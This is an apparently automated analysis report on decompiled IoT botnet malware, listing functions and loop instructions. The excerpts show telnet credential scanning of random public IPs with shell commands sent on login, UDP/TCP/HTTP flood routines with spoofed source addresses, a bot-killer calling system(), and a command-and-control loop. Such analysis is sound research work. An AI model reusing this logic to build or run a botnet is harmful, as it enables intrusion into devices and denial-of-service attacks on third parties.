=================FUNCTION : _promoted_size ===================
++++++++ FUNCTION START 32325
++++++++ FUNCTION END 32515
++++++++ FUNCTION LENGTH 190
    while (true) {
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 33682
++++++++ FUNCTION END 33863
++++++++ FUNCTION LENGTH 181
    int32_t result = __GI_fgets_unlocked((char *)a1, a2, a3); // 0x148f0
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 30209
++++++++ FUNCTION END 30402
++++++++ FUNCTION LENGTH 193
    while (true) {
=================FUNCTION : __heap_alloc_at ===================
++++++++ FUNCTION START 44719
++++++++ FUNCTION END 44945
++++++++ FUNCTION LENGTH 226
    while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 29814
++++++++ FUNCTION END 30023
++++++++ FUNCTION LENGTH 209
        while (true) {
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 35951
++++++++ FUNCTION END 36142
++++++++ FUNCTION LENGTH 191
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 5115
++++++++ FUNCTION END 5307
++++++++ FUNCTION LENGTH 192
    while (true) {
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 72876
++++++++ FUNCTION END 73136
++++++++ FUNCTION LENGTH 260
    while (true) {
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 6336
++++++++ FUNCTION END 6514
++++++++ FUNCTION LENGTH 178
            v165 = rand_cmwc() % 26;
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 38822
++++++++ FUNCTION END 38998
++++++++ FUNCTION LENGTH 176
    uint32_t v165 = __GI_tcgetattr(); // 0x155a8
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 68772
++++++++ FUNCTION END 69024
++++++++ FUNCTION LENGTH 252
    while (true) {
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 11445
++++++++ FUNCTION END 11618
++++++++ FUNCTION LENGTH 173
    free();
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 66081
++++++++ FUNCTION END 66248
++++++++ FUNCTION LENGTH 167
    return __read_etc_hosts_r();
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 3876
++++++++ FUNCTION END 4042
++++++++ FUNCTION LENGTH 166
    return print(&a1, a2, (int32_t)&a3);
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 41667
++++++++ FUNCTION END 41844
++++++++ FUNCTION LENGTH 177
    int32_t v165 = recv(sock, buf, length, flags); // 0x15b8c
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 73413
++++++++ FUNCTION END 73609
++++++++ FUNCTION LENGTH 196
    while (true) {
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 27878
++++++++ FUNCTION END 28045
++++++++ FUNCTION LENGTH 167
    return __GI_vsnprintf();
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 7157
++++++++ FUNCTION END 7346
++++++++ FUNCTION LENGTH 189
        result = __libc_recv(a1, (int32_t *)a3, a4, 0, (int32_t)&v170);
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 34050
++++++++ FUNCTION END 34286
++++++++ FUNCTION LENGTH 236
            while (true) {
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 1 @ trim ====================================
++++++++ WHILE START : 2142 
++++++++ WHILE FUNCTION : trim 
++++++++ WHILE END : 2174 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 3 @ prints ====================================
++++++++ WHILE START : 2557 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2569 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v168);
=============================WHILE LOOPS ID : 4 @ prints ====================================
++++++++ WHILE START : 2700 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2712 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v168);
=============================WHILE LOOPS ID : 5 @ prints ====================================
++++++++ WHILE START : 2850 
++++++++ WHILE FUNCTION : prints 
++++++++ WHILE END : 2862 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar((int32_t *)a1, v168);
=============================WHILE LOOPS ID : 7 @ print ====================================
++++++++ WHILE START : 3429 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 3695 
++++++++ INTRESTING INSTRUCTIONS :  
		printchar(a1, (int32_t)*v168);
		while (true) {
		while (true) {
		int32_t v191 = prints(v165, v188, v179, v173, (int32_t)&v190); // 0x8a5c
		int32_t v193 = printi(v165, v192, 10, 1, v179, v173, 97) + result; // 0x8acc
		int32_t v195 = printi(v165, v194, 16, 0, v179, v173, 97) + result; // 0x8b30
		int32_t v197 = printi(v165, v196, 16, 0, v179, v173, 65) + result; // 0x8b94
		int32_t v200 = printi(v165, v199, 10, 0, v179, v173, 97) + result; // 0x8bf8
		int32_t v203 = prints(v165, (char *)&v167, v179, v173, v201); // 0x8c4c
		printchar(a1, (int32_t)*v168);
=============================WHILE LOOPS ID : 8 @ fdpclose ====================================
++++++++ WHILE START : 4879 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 4905 
++++++++ INTRESTING INSTRUCTIONS :  
		v170 = __libc_waitpid(v171, (int32_t)&v169, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v168, 0);
=============================WHILE LOOPS ID : 11 @ getBogos ====================================
++++++++ WHILE START : 6074 
++++++++ WHILE FUNCTION : getBogos 
++++++++ WHILE END : 6138 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v167, 0x1000, v165, v167) == 0) {
		__libc_close(v165);
		uppercase((char *)&v166);
		if (strstr(v167, "BOGOMIPS") == v167) {
		while (true) {
		while (true) {
		__libc_close(v165);
=============================WHILE LOOPS ID : 12 @ getCores ====================================
++++++++ WHILE START : 6313 
++++++++ WHILE FUNCTION : getCores 
++++++++ WHILE END : 6332 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v166, 0x1000, v167, v166) == 0) {
		__libc_close(v167);
		uppercase((char *)&v165);
		if (strstr(v166, "BOGOMIPS") == v166) {
=============================WHILE LOOPS ID : 13 @ recvLine ====================================
++++++++ WHILE START : 6705 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 6779 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v172, (int32_t)"PING");
		while (true) {
		if (__libc_recv(v172, (int32_t *)&v173, 1, 0, v176) != 1) {
=============================WHILE LOOPS ID : 14 @ recvLine ====================================
++++++++ WHILE START : 6786 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 6797 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_recv(v172, (int32_t *)&v173, 1, 0, v176) == 1) {
=============================WHILE LOOPS ID : 15 @ contains_string ====================================
++++++++ WHILE START : 8387 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 8402 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v168, 4 * v167) != 0) {
=============================WHILE LOOPS ID : 16 @ listFork ====================================
++++++++ WHILE START : 8807 
++++++++ WHILE FUNCTION : listFork 
++++++++ WHILE END : 8827 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 17 @ matchPrompt ====================================
++++++++ WHILE START : 9244 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 9306 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 18 @ readUntil ====================================
++++++++ WHILE START : 9484 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 9564 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v171 = __libc_recv(a1, (int32_t *)v170, 1, 0, v170); // 0xa904
		if (strstr(a6, (char *)a2) == 0) {
		int32_t v172 = __libc_recv(a1, (int32_t *)(v170 + 1), 2, 0, v168); // 0xa96c
=============================WHILE LOOPS ID : 21 @ StartTheLelz ====================================
++++++++ WHILE START : 12375 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 12879 
++++++++ INTRESTING INSTRUCTIONS :  
		case 0: {
		GetRandomPublicIP(24, v167, v179, v181, v181);
		socket();
		if (__libc_connect(*v178, (struct sockaddr *)&v165, 16) == -1) {
		socket();
		case 1: {
		while (true) {
		getsockopt();
		case 2: {
		case 3: {
		if (__libc_send(*v196, (int32_t *)v197, len, 0x4000) < 0) {
		if (__libc_send(*v196, (int32_t *)"\r\n", 2, 0x4000) < 0) {
		case 4: {
		case 5: {
		if (__libc_send(*v201, (int32_t *)v202, len2, 0x4000) < 0) {
		if (__libc_send(*v201, (int32_t *)"\r\n", 2, 0x4000) < 0) {
		case 6: {
		get_telstate_host(v172, v167, v173);
		sockprintf(v207, (int32_t)"LOGIN FOUND - %s:%s:%s");
		case 7: {
		__libc_send(*v208, (int32_t *)"sh\r\n", 4, 0x4000);
		__libc_send(*v208, (int32_t *)"shell\r\n", 7, 0x4000);
		if (__libc_send(*v208, (int32_t *)str3, len3, 0x4000) < 0) {
=============================WHILE LOOPS ID : 24 @ sendSTD ====================================
++++++++ WHILE START : 13093 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 13119 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		__libc_send(v165, (int32_t *)v174, 65, 0);
		__libc_connect(v165, (struct sockaddr *)&v167, 16);
		__libc_close(v165);
=============================WHILE LOOPS ID : 25 @ sendUDP ====================================
++++++++ WHILE START : 13323 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 13363 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v167, (int32_t *)v168, a5, 0, (int32_t)&v164, 16);
		rand_cmwc();
=============================WHILE LOOPS ID : 26 @ sendUDP ====================================
++++++++ WHILE START : 13430 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 13485 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v174, (int32_t *)v182, v179, 0, (int32_t)&v199, (int32_t)&v199);
		*v183 = (char)rand_cmwc();
		v200 = rand_cmwc();
		*(char *)(v182 + 4) = (char)rand_cmwc();
		int32_t v201 = GetRandomIP(v178); // 0xfa20
=============================WHILE LOOPS ID : 27 @ sendTCP ====================================
++++++++ WHILE START : 13746 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13830 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__GI_strcoll(v196, (int32_t)"rst") == 0) {
		if (__GI_strcoll(v196, (int32_t)"psh") == 0) {
		sockprintf(v165, (int32_t)"Invalid flag \"%s\"");
=============================WHILE LOOPS ID : 28 @ sendTCP ====================================
++++++++ WHILE START : 13856 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13887 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v164, (int32_t *)v171, v168, 0, (int32_t)&v191, (int32_t)&v191);
		v183 = GetRandomIP(v167);
		*(char *)(v171 + 4) = (char)rand_cmwc();
		*v177 = rand_cmwc();
		*v173 = (char)rand_cmwc();
		*v188 = (char)(0x1000000 * tcpcsum(v171, v172, v172, 0) / 0x1000000);
=============================WHILE LOOPS ID : 29 @ sendTCP ====================================
++++++++ WHILE START : 13915 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13932 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v164, (int32_t *)v171, v168, 0, (int32_t)&v191, (int32_t)&v191);
		v183 = GetRandomIP(v167);
		*(char *)(v171 + 4) = (char)rand_cmwc();
		*v177 = rand_cmwc();
		*v173 = (char)rand_cmwc();
		*v188 = (char)(0x1000000 * tcpcsum(v171, v172, v172, 0) / 0x1000000);
=============================WHILE LOOPS ID : 30 @ botkiller ====================================
++++++++ WHILE START : 14107 
++++++++ WHILE FUNCTION : botkiller 
++++++++ WHILE END : 14125 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_system(v165);
		__libc_system(v165);
=============================WHILE LOOPS ID : 31 @ sendHTTP ====================================
++++++++ WHILE START : 14476 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 14490 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_fork() != 0) {
=============================WHILE LOOPS ID : 32 @ sendHTTP ====================================
++++++++ WHILE START : 14494 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 14509 
++++++++ INTRESTING INSTRUCTIONS :  
		v170 = socket_connect(a1, a3, (int32_t)a3);
=============================WHILE LOOPS ID : 33 @ sendHTTP2 ====================================
++++++++ WHILE START : 14696 
++++++++ WHILE FUNCTION : sendHTTP2 
++++++++ WHILE END : 14739 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		sprintf(v167, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2, v169);
		if (__libc_fork() != 0) {
		while (true) {
		if (socket_connect(a2, a3, (int32_t)a3) != 0) {
=============================WHILE LOOPS ID : 34 @ processCmd ====================================
++++++++ WHILE START : 15244 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15259 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v182, v170, v171, v172, v173, v174, v176, v178);
=============================WHILE LOOPS ID : 35 @ processCmd ====================================
++++++++ WHILE START : 15394 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15409 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v236, v227, v228, v229, v235, v232, v230);
=============================WHILE LOOPS ID : 36 @ processCmd ====================================
++++++++ WHILE START : 15433 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15451 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendHTTP(*v184, v204, (char)(v185 % 0x10000), v206, v186, v187);
=============================WHILE LOOPS ID : 37 @ processCmd ====================================
++++++++ WHILE START : 15487 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15496 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 40 @ processCmd ====================================
++++++++ WHILE START : 15584 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15594 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 41 @ processCmd ====================================
++++++++ WHILE START : 15623 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15632 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 44 @ processCmd ====================================
++++++++ WHILE START : 15750 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15759 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 47 @ processCmd ====================================
++++++++ WHILE START : 15874 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15883 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 50 @ processCmd ====================================
++++++++ WHILE START : 15946 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15963 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendCNC(v245, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 51 @ processCmd ====================================
++++++++ WHILE START : 15992 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16008 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v247, v202, v203, 0);
=============================WHILE LOOPS ID : 52 @ processCmd ====================================
++++++++ WHILE START : 16015 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16065 
++++++++ INTRESTING INSTRUCTIONS :  
		sockprintf(v159, (int32_t)"None Killed.");
		sockprintf(v159, (int32_t)"Killed %d.");
		if (*v251 != __libc_getpid()) {
		kill();
=============================WHILE LOOPS ID : 55 @ processCmd ====================================
++++++++ WHILE START : 16203 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16213 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 56 @ processCmd ====================================
++++++++ WHILE START : 16240 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16249 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 59 @ processCmd ====================================
++++++++ WHILE START : 16336 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16345 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 62 @ processCmd ====================================
++++++++ WHILE START : 16430 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16440 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 63 @ processCmd ====================================
++++++++ WHILE START : 16467 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16476 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 66 @ processCmd ====================================
++++++++ WHILE START : 16563 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16572 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 69 @ processCmd ====================================
++++++++ WHILE START : 16677 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16687 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 70 @ processCmd ====================================
++++++++ WHILE START : 16714 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16723 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 73 @ processCmd ====================================
++++++++ WHILE START : 16810 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16819 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 16904 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16914 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 16941 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16950 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 17032 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17041 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 17082 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17094 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v184, v204, (char)(v185 % 0x10000), v206, v186, v187);
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 17140 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17150 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 17177 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17186 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 17233 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17242 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 17287 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17297 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 17324 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17333 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 17380 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17389 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 17454 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17464 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 17491 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17500 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 17547 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17556 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 17601 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17611 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 17638 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17647 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 17694 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17703 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 17751 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17763 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendHTTP(*v184, v204, (char)(v185 % 0x10000), v206, v186, v187);
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 17809 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17819 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 17846 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17855 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 17902 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17911 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 17956 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17966 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 17993 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18002 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 18049 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18058 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendSTD(v221, v202, v203, 0);
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 18123 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18133 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 18176 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18186 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
		sendCNC(v219, v198, v199, 0);
		__libc_close(v159);
=============================WHILE LOOPS ID : 103 @ getOurIP ====================================
++++++++ WHILE START : 18617 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 18724 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v172, 0x1000, v170, v172) != 0) {
		if (strstr(v172, "\t00000000\t") != 0) {
		__libc_close(v170);
		__libc_close(v165);
		__libc_close(v165);
		__libc_close(v170);
		__libc_close(v165);
		__libc_close(v165);
		__libc_close(v170);
		__libc_close(v165);
		__libc_close(v165);
=============================WHILE LOOPS ID : 104 @ main ====================================
++++++++ WHILE START : 19097 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19552 
++++++++ INTRESTING INSTRUCTIONS :  
		sprintf(v178, (int32_t)"\"%s%s\"\n", v173, v176 + len2, (int32_t)&v171, (int32_t)&v171);
		while (true) {
		while (true) {
		fgets((int32_t)&v164, 1024, v160);
		if (__GI_strcasecmp((char *)&v164, v178) == 0) {
		__GI_fclose(v179);
		int32_t v181 = __GI_fopen((int32_t)v161, (int32_t)&v180); // 0x11fc8
		__GI_fclose((char *)v181);
		getOurIP();
		v167 = __libc_fork();
		if (__libc_fork() == 0) {
		zprintf((int32_t)"fork failed\n");
		while (true) {
		if (initConnection() != 0) {
		while (true) {
		if (initConnection() == 0) {
		getBuild();
		__GI_inet_ntoa((int32_t *)v182);
		sockprintf(v162, (int32_t)"BUILD %s:%s");
		while (true) {
		while (true) {
		if (recvLine(v162, (char *)&v165, 0x1000, v170) == -1) {
		while (true) {
		if (__libc_waitpid(v190, 0, 1) >= 1) {
		while (true) {
		while (true) {
		free();
		if (strstr(v170, "PING") == v170) {
		sockprintf(v162, (int32_t)"PONG");
		if (strstr(v170, "DUP") == v170) {
		zprintf((int32_t)"PEACE OUT IMMA DUP\n");
		while (true) {
		if (initConnection() == 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (listFork() == 0) {
		while (true) {
		processCmd(v217, &v177);
		processCmd(v217, &v177);
		while (true) {
		free();
		while (true) {
		if (__libc_waitpid(v190, 0, 1) < 1) {
		getBuild();
		__GI_inet_ntoa((int32_t *)v182);
		sockprintf(v162, (int32_t)"BUILD %s:%s");
		__libc_waitpid(v167, (int32_t)&v163, 0);
		zprintf((int32_t)"fork failed\n");
		while (true) {
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 105 @ main ====================================
++++++++ WHILE START : 19576 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19582 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 106 @ main ====================================
++++++++ WHILE START : 19598 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19604 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 107 @ main ====================================
++++++++ WHILE START : 19628 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19634 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 108 @ main ====================================
++++++++ WHILE START : 19650 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19656 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 109 @ main ====================================
++++++++ WHILE START : 19663 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19680 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v169, 1024, v225, v169) == 0) {
		fdpclose(v225);
